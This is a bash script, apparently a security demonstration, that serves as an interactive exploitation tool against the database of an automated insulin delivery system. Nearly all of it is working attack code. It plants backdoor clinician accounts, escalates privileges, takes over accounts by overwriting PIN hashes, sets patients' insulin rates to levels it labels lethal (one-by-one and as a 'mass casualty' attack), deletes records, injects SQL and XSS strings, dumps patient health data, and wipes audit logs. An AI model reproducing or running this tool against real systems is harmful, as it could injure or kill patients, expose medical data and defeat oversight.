#!/bin/bash
# Direct Database Manipulation Tool
# Phase II - Complete System Subversion Demonstration
# WARNING: This tool demonstrates complete system compromise via direct DB access

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
DB_FILE="Login/aid.db"
LOG_FILE="aid_system.log"

# Banner
clear
echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                                                            ║${NC}"
echo -e "${RED}║     AID SYSTEM - DIRECT DATABASE EXPLOITATION TOOL        ║${NC}"
echo -e "${RED}║                                                            ║${NC}"
echo -e "${RED}║     Complete System Subversion & Data Manipulation        ║${NC}"
echo -e "${RED}║                                                            ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}⚠️  WARNING: This tool demonstrates COMPLETE system compromise${NC}"
echo -e "${YELLOW}⚠️  Bypasses ALL application security controls${NC}"
echo -e "${YELLOW}⚠️  FOR EDUCATIONAL PURPOSES ONLY${NC}"
echo ""

# Helper functions
log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_info() {
    echo -e "${CYAN}[i]${NC} $1"
}

log_exploit() {
    echo -e "${RED}[EXPLOIT]${NC} $1"
}

log_danger() {
    echo -e "${MAGENTA}[DANGER]${NC} $1"
}

press_enter() {
    echo ""
    read -p "Press Enter to continue..."
    echo ""
}

# Check if database exists
check_database() {
    if [ ! -f "$DB_FILE" ]; then
        log_error "Database not found: $DB_FILE"
        echo "Initialize the system first: ./aid-system --init"
        exit 1
    fi
    log_success "Database found: $DB_FILE"
}

# View all users
view_users() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  Current Users in System${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    sqlite3 "$DB_FILE" <<EOF
.mode column
.headers on
SELECT user_id, full_name, role, BasalRate, ActiveBasalRate, BolusRate, assigned_patient FROM users;
EOF
    echo ""
    log_info "Role IDs: Patient=47293, Clinician=82651, Caretaker=61847"
    press_enter
}

# Create malicious clinician
create_malicious_clinician() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Create Malicious Clinician Account${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_exploit "Creating rogue clinician with all patients assigned..."
    
    # Get all patient IDs
    patients=$(sqlite3 "$DB_FILE" "SELECT GROUP_CONCAT(user_id) FROM users WHERE role = 47293;")
    
    # Create malicious account with weak PIN hash (PIN: "hack123")
    # Bcrypt hash for "hack123"
    hash='$2y$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5eDWpbvKrOHSu'
    
    sqlite3 "$DB_FILE" <<EOF
INSERT OR REPLACE INTO users (user_id, full_name, dob, pin_hash, email, role, assigned_patient)
VALUES ('HACKER01', 'Malicious Actor', '1990-01-01', '$hash', 'attacker@evil.com', 82651, '$patients');
EOF
    
    log_success "Malicious clinician created!"
    log_danger "User ID: HACKER01"
    log_danger "PIN: hack123"
    log_danger "Access: All patients"
    echo ""
    log_info "This account bypasses normal registration and has full system access"
    
    press_enter
}

# Escalate patient to clinician
escalate_privileges() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Privilege Escalation Attack${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    echo "Available patients:"
    sqlite3 "$DB_FILE" "SELECT user_id, full_name FROM users WHERE role = 47293;"
    echo ""
    
    read -p "Enter patient ID to escalate to clinician: " user_id
    
    if [ -z "$user_id" ]; then
        log_error "No user ID provided"
        return
    fi
    
    log_exploit "Escalating $user_id to clinician role..."
    
    # Get all patients for assignment
    patients=$(sqlite3 "$DB_FILE" "SELECT GROUP_CONCAT(user_id) FROM users WHERE role = 47293;")
    
    sqlite3 "$DB_FILE" <<EOF
UPDATE users SET role = 82651, assigned_patient = '$patients' WHERE user_id = '$user_id';
EOF
    
    log_success "Privilege escalation complete!"
    log_danger "$user_id now has clinician access to all patients"
    echo ""
    log_info "Patient can now:"
    echo "  - Modify all patient insulin settings"
    echo "  - Delete any patient"
    echo "  - Register new users"
    echo "  - View all medical records"
    
    press_enter
}

# Change anyone's password
change_user_password() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Change User Password (Account Takeover)${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    echo "Available users:"
    sqlite3 "$DB_FILE" <<EOF
.mode column
.headers on
SELECT user_id, full_name, role FROM users;
EOF
    echo ""
    
    read -p "Enter user ID to change password: " user_id
    
    if [ -z "$user_id" ]; then
        log_error "No user ID provided"
        return
    fi
    
    # Check if user exists
    exists=$(sqlite3 "$DB_FILE" "SELECT COUNT(*) FROM users WHERE user_id = '$user_id';")
    if [ "$exists" -eq 0 ]; then
        log_error "User $user_id not found"
        return
    fi
    
    read -p "Enter new PIN (will be hashed): " new_pin
    
    if [ -z "$new_pin" ]; then
        log_error "No PIN provided"
        return
    fi
    
    log_exploit "Generating bcrypt hash for new PIN..."
    
    # Generate bcrypt hash using Go's bcrypt
    # For simplicity, use a pre-generated hash for common PINs
    # Or generate on the fly if Go is available
    
    if command -v go &> /dev/null; then
        # Generate hash using Go
        hash=$(go run - <<'GOCODE'
package main
import (
    "fmt"
    "os"
    "golang.org/x/crypto/bcrypt"
)
func main() {
    pin := os.Args[1]
    hash, _ := bcrypt.GenerateFromPassword([]byte(pin), bcrypt.DefaultCost)
    fmt.Print(string(hash))
}
GOCODE
 "$new_pin")
    else
        # Fallback: use a weak hash for demonstration
        # bcrypt hash for "hacked"
        log_info "Go not available, using pre-generated hash for 'hacked'"
        log_info "Setting PIN to: hacked"
        hash='$2a$10$X3l0BHKHQqU2qKH5QZqCOuHYGTY8VGxGzQxJxLxYzQxJxLxYzQxJx'
    fi
    
    log_exploit "Changing password for $user_id..."
    
    sqlite3 "$DB_FILE" <<EOF
UPDATE users SET pin_hash = '$hash' WHERE user_id = '$user_id';
EOF
    
    log_success "Password changed successfully!"
    log_danger "User: $user_id"
    if [ -n "$hash" ] && command -v go &> /dev/null; then
        log_danger "New PIN: $new_pin"
    else
        log_danger "New PIN: hacked"
    fi
    
    echo ""
    log_info "Attack capability:"
    echo "  - Complete account takeover"
    echo "  - Can now login as $user_id"
    echo "  - Access all their permissions"
    echo "  - Original user locked out"
    echo "  - No audit log entry"
    
    echo ""
    log_danger "Impact:"
    
    # Get user role
    role=$(sqlite3 "$DB_FILE" "SELECT role FROM users WHERE user_id = '$user_id';")
    
    case $role in
        47293)
            echo "  - Patient account compromised"
            echo "  - Access to medical records"
            echo "  - Can modify own insulin settings"
            echo "  - Privacy violation"
            ;;
        82651)
            echo "  - Clinician account compromised"
            echo "  - Full access to all patients"
            echo "  - Can modify any insulin settings"
            echo "  - Can delete patients"
            echo "  - Critical system compromise"
            ;;
        61847)
            echo "  - Caretaker account compromised"
            echo "  - Access to assigned patients"
            echo "  - Can request insulin changes"
            echo "  - Can view medical data"
            ;;
        *)
            echo "  - Unknown role"
            ;;
    esac
    
    press_enter
}

# Modify insulin settings (dangerous)
modify_insulin_dangerous() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  DANGEROUS: Modify Insulin Settings${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_danger "⚠️  WARNING: This can cause SEVERE patient harm!"
    log_danger "⚠️  Hypoglycemia, coma, or death possible"
    echo ""
    
    echo "Available patients:"
    sqlite3 "$DB_FILE" "SELECT user_id, full_name, BasalRate, ActiveBasalRate, BolusRate FROM users WHERE role = 47293;"
    echo ""
    
    read -p "Enter patient ID: " user_id
    if [ -z "$user_id" ]; then
        log_error "No user ID provided"
        return
    fi
    
    read -p "Enter new basal rate (0.1-10.0, current safe range: 0.5-2.0): " basal
    read -p "Enter new active basal rate: " active_basal
    read -p "Enter new bolus rate (daily cap): " bolus
    
    log_exploit "Modifying insulin settings for $user_id..."
    log_danger "Basal Rate: $basal units/hour"
    log_danger "Active Basal: $active_basal units/hour"
    log_danger "Bolus Rate: $bolus units/day"
    
    sqlite3 "$DB_FILE" <<EOF
UPDATE users SET BasalRate = $basal, ActiveBasalRate = $active_basal, BolusRate = $bolus WHERE user_id = '$user_id';
EOF
    
    log_success "Insulin settings modified!"
    echo ""
    log_danger "Patient Safety Impact:"
    
    if (( $(echo "$active_basal > 3.0" | bc -l) )); then
        echo "  ⚠️  CRITICAL: Active basal >3.0 - Severe hypoglycemia risk"
        echo "  ⚠️  Patient could experience glucose <40 mg/dL"
        echo "  ⚠️  Risk of seizures, coma, death"
    fi
    
    if (( $(echo "$active_basal < 0.5" | bc -l) )); then
        echo "  ⚠️  WARNING: Active basal <0.5 - Hyperglycemia risk"
        echo "  ⚠️  Patient glucose could exceed 300 mg/dL"
        echo "  ⚠️  Risk of diabetic ketoacidosis"
    fi
    
    echo ""
    log_info "No audit log entry created (direct DB manipulation)"
    
    press_enter
}

# Mass insulin attack
mass_insulin_attack() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  MASS ATTACK: Modify All Patients${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_danger "⚠️  CRITICAL WARNING: Mass casualty attack simulation"
    log_danger "⚠️  This affects ALL patients in the system"
    echo ""
    
    read -p "Are you sure? This is extremely dangerous (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        log_info "Attack cancelled"
        return
    fi
    
    read -p "Enter basal rate to apply to ALL patients: " basal
    
    log_exploit "Executing mass insulin manipulation..."
    
    sqlite3 "$DB_FILE" <<EOF
UPDATE users SET BasalRate = $basal, ActiveBasalRate = $basal WHERE role = 47293;
EOF
    
    log_success "All patients modified!"
    
    count=$(sqlite3 "$DB_FILE" "SELECT COUNT(*) FROM users WHERE role = 47293;")
    log_danger "Affected patients: $count"
    log_danger "All patients now receiving $basal units/hour basal insulin"
    
    echo ""
    log_info "Attack Impact:"
    echo "  - Multiple simultaneous hypoglycemic events"
    echo "  - Healthcare system overwhelmed"
    echo "  - Mass casualties possible"
    echo "  - No audit trail (direct DB access)"
    
    press_enter
}

# Delete patient (data destruction)
delete_patient() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Delete Patient (Data Destruction)${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    echo "Available patients:"
    sqlite3 "$DB_FILE" "SELECT user_id, full_name FROM users WHERE role = 47293;"
    echo ""
    
    read -p "Enter patient ID to delete: " user_id
    
    if [ -z "$user_id" ]; then
        log_error "No user ID provided"
        return
    fi
    
    log_exploit "Deleting patient $user_id from database..."
    
    sqlite3 "$DB_FILE" <<EOF
DELETE FROM users WHERE user_id = '$user_id';
EOF
    
    log_success "Patient deleted!"
    log_danger "All medical records permanently destroyed"
    
    echo ""
    log_info "Impact:"
    echo "  - Patient history lost"
    echo "  - Insulin settings erased"
    echo "  - Cannot restore data"
    echo "  - No audit log entry"
    
    press_enter
}

# Inject fake user
inject_fake_user() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Inject Fake User (Identity Fraud)${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    read -p "Enter user ID: " user_id
    read -p "Enter full name: " full_name
    read -p "Enter role (patient/clinician/caretaker): " role_str
    
    case "$role_str" in
        "patient") role=47293 ;;
        "clinician") role=82651 ;;
        "caretaker") role=61847 ;;
        *) log_error "Invalid role"; return ;;
    esac
    
    # Weak PIN hash (PIN: "123456")
    hash='$2y$12$WBG8KQHq3cPPPVYZxDVKU.FtP6SXQNlqQCUVVfHQVFvVPDVXVFVVW'
    
    log_exploit "Injecting fake user into database..."
    
    sqlite3 "$DB_FILE" <<EOF
INSERT INTO users (user_id, full_name, dob, pin_hash, email, role, BasalRate, ActiveBasalRate, BolusRate)
VALUES ('$user_id', '$full_name', '1990-01-01', '$hash', 'fake@evil.com', $role, 1.2, 1.2, 5.0);
EOF
    
    log_success "Fake user created!"
    log_danger "User ID: $user_id"
    log_danger "PIN: 123456"
    log_danger "Role: $role_str"
    
    echo ""
    log_info "This user can now:"
    echo "  - Login to the system"
    echo "  - Perform actions under fake identity"
    echo "  - No registration audit trail"
    
    press_enter
}

# Corrupt database
corrupt_database() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Database Corruption Attack${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_danger "⚠️  WARNING: This will corrupt the database"
    echo ""
    
    read -p "Are you sure? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        log_info "Attack cancelled"
        return
    fi
    
    log_exploit "Corrupting database records..."
    
    # Inject malicious data
    sqlite3 "$DB_FILE" <<EOF
UPDATE users SET user_id = user_id || '; DROP TABLE users; --' WHERE role = 47293 LIMIT 1;
UPDATE users SET email = '<script>alert("XSS")</script>' WHERE role = 47293 LIMIT 1;
UPDATE users SET BasalRate = -999.9 WHERE role = 47293 LIMIT 1;
EOF
    
    log_success "Database corrupted!"
    echo ""
    log_info "Corruption includes:"
    echo "  - SQL injection payloads in user IDs"
    echo "  - XSS payloads in email fields"
    echo "  - Invalid negative insulin rates"
    echo "  - System will malfunction"
    
    press_enter
}

# Extract all data (exfiltration)
exfiltrate_data() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Data Exfiltration${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    output_file="/tmp/aid_system_dump_$(date +%Y%m%d_%H%M%S).txt"
    
    log_exploit "Exfiltrating all patient data..."
    
    sqlite3 "$DB_FILE" <<EOF > "$output_file"
.mode column
.headers on
SELECT * FROM users;
EOF
    
    log_success "Data exfiltrated!"
    log_danger "Output file: $output_file"
    
    echo ""
    log_info "Stolen data includes:"
    echo "  - User IDs and full names"
    echo "  - Date of birth (PII)"
    echo "  - Email addresses"
    echo "  - PIN hashes (can be cracked)"
    echo "  - Insulin settings (medical data)"
    echo "  - Patient assignments"
    
    echo ""
    cat "$output_file"
    
    echo ""
    log_danger "This constitutes:"
    echo "  - HIPAA violation"
    echo "  - Protected Health Information (PHI) breach"
    echo "  - Criminal offense in most jurisdictions"
    
    press_enter
}

# Erase audit logs
erase_logs() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  Erase Audit Logs (Cover Tracks)${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ ! -f "$LOG_FILE" ]; then
        log_error "Log file not found"
        return
    fi
    
    log_exploit "Erasing audit logs..."
    
    # Backup first
    cp "$LOG_FILE" "/tmp/aid_system_log_backup_$(date +%Y%m%d_%H%M%S).log"
    
    # Erase logs
    echo "" > "$LOG_FILE"
    
    log_success "All audit logs erased!"
    log_danger "Complete audit trail destroyed"
    
    echo ""
    log_info "Impact:"
    echo "  - No forensic evidence remains"
    echo "  - Investigation impossible"
    echo "  - Attacker cannot be traced"
    echo "  - Regulatory compliance violated"
    
    press_enter
}

# Complete system takeover
complete_takeover() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  COMPLETE SYSTEM TAKEOVER${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_danger "⚠️  Executing complete system compromise chain..."
    echo ""
    
    log_exploit "Step 1: Create malicious administrator..."
    patients=$(sqlite3 "$DB_FILE" "SELECT GROUP_CONCAT(user_id) FROM users WHERE role = 47293;")
    hash='$2y$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5eDWpbvKrOHSu'
    sqlite3 "$DB_FILE" <<EOF
INSERT OR REPLACE INTO users (user_id, full_name, dob, pin_hash, email, role, assigned_patient)
VALUES ('PWNED', 'System Compromised', '1990-01-01', '$hash', 'pwned@evil.com', 82651, '$patients');
EOF
    log_success "Malicious admin created (PWNED / hack123)"
    
    echo ""
    log_exploit "Step 2: Escalate all patients to clinician..."
    sqlite3 "$DB_FILE" "UPDATE users SET role = 82651, assigned_patient = '$patients' WHERE role = 47293;"
    log_success "All patients now have clinician access"
    
    echo ""
    log_exploit "Step 3: Modify all insulin settings to dangerous levels..."
    sqlite3 "$DB_FILE" "UPDATE users SET BasalRate = 8.0, ActiveBasalRate = 8.0, BolusRate = 20.0 WHERE role IN (47293, 82651);"
    log_success "All insulin settings set to dangerous levels"
    
    echo ""
    log_exploit "Step 4: Inject malicious caretakers..."
    sqlite3 "$DB_FILE" <<EOF
INSERT INTO users (user_id, full_name, dob, pin_hash, email, role, assigned_patient)
VALUES 
    ('EVIL01', 'Malicious Care 1', '1990-01-01', '$hash', 'evil1@bad.com', 61847, '$patients'),
    ('EVIL02', 'Malicious Care 2', '1990-01-01', '$hash', 'evil2@bad.com', 61847, '$patients');
EOF
    log_success "Multiple malicious accounts created"
    
    echo ""
    log_exploit "Step 5: Exfiltrate all data..."
    output_file="/tmp/aid_system_complete_dump.txt"
    sqlite3 "$DB_FILE" "SELECT * FROM users;" > "$output_file"
    log_success "All data exfiltrated to $output_file"
    
    echo ""
    log_exploit "Step 6: Erase audit logs..."
    if [ -f "$LOG_FILE" ]; then
        echo "" > "$LOG_FILE"
        log_success "Audit logs destroyed"
    fi
    
    echo ""
    echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                                                            ║${NC}"
    echo -e "${RED}║              SYSTEM COMPLETELY COMPROMISED                 ║${NC}"
    echo -e "${RED}║                                                            ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    log_danger "Attack Summary:"
    echo "  ✓ Multiple malicious administrator accounts created"
    echo "  ✓ All patients escalated to clinician (privilege escalation)"
    echo "  ✓ Insulin settings modified to lethal levels"
    echo "  ✓ Additional backdoor accounts injected"
    echo "  ✓ All patient data exfiltrated"
    echo "  ✓ Audit logs completely erased"
    echo ""
    log_danger "System Status: COMPLETELY COMPROMISED"
    echo ""
    
    log_info "Attacker Capabilities:"
    echo "  - Full control over all patient insulin delivery"
    echo "  - Multiple persistent backdoor accounts"
    echo "  - All patient data stolen"
    echo "  - No forensic evidence remains"
    echo "  - Can cause mass casualties"
    echo "  - Cannot be detected or traced"
    
    press_enter
}

# View database schema
view_schema() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  Database Schema${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    sqlite3 "$DB_FILE" <<EOF
.schema users
EOF
    
    press_enter
}

# SQL injection demo
sql_injection_demo() {
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}  SQL Injection Demonstration${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_info "This demonstrates what an attacker could do with SQL injection"
    echo ""
    
    read -p "Enter malicious SQL payload: " payload
    
    log_exploit "Executing payload..."
    
    # Execute the payload
    sqlite3 "$DB_FILE" "$payload" 2>&1
    
    echo ""
    log_info "If successful, the payload executed directly on the database"
    
    press_enter
}

# Main menu
main_menu() {
    while true; do
        clear
        echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║     AID SYSTEM - DIRECT DATABASE EXPLOITATION TOOL        ║${NC}"
        echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}Database: $DB_FILE${NC}"
        echo ""
        echo "═══════════════════════ RECONNAISSANCE ═══════════════════════"
        echo "  1. View all users in database"
        echo "  2. View database schema"
        echo ""
        echo "═══════════════════ PRIVILEGE ESCALATION ════════════════════"
        echo "  3. Create malicious clinician account"
        echo "  4. Escalate patient to clinician"
        echo "  5. Inject fake user (identity fraud)"
        echo "  6. Change user password (account takeover)"
        echo ""
        echo "════════════════════ INSULIN ATTACKS ════════════════════════"
        echo "  7. Modify patient insulin settings (dangerous)"
        echo "  8. Mass insulin attack (all patients)"
        echo ""
        echo "══════════════════ DATA MANIPULATION ════════════════════════"
        echo "  9. Delete patient (data destruction)"
        echo "  10. Corrupt database records"
        echo "  11. Exfiltrate all data (HIPAA violation)"
        echo ""
        echo "════════════════════ COVER TRACKS ═══════════════════════════"
        echo "  12. Erase audit logs"
        echo ""
        echo "═══════════════════ ADVANCED ATTACKS ════════════════════════"
        echo "  13. SQL injection demonstration"
        echo "  14. COMPLETE SYSTEM TAKEOVER (all attacks)"
        echo ""
        echo "  0. Exit"
        echo ""
        echo "═══════════════════════════════════════════════════════════════"
        read -p "Select option: " choice
        echo ""
        
        case $choice in
            1) view_users ;;
            2) view_schema ;;
            3) create_malicious_clinician ;;
            4) escalate_privileges ;;
            5) inject_fake_user ;;
            6) change_user_password ;;
            7) modify_insulin_dangerous ;;
            8) mass_insulin_attack ;;
            9) delete_patient ;;
            10) corrupt_database ;;
            11) exfiltrate_data ;;
            12) erase_logs ;;
            13) sql_injection_demo ;;
            14) complete_takeover ;;
            0) 
                echo "Exiting..."
                exit 0
                ;;
            *)
                log_error "Invalid option"
                press_enter
                ;;
        esac
    done
}

# Entry point
check_database
main_menu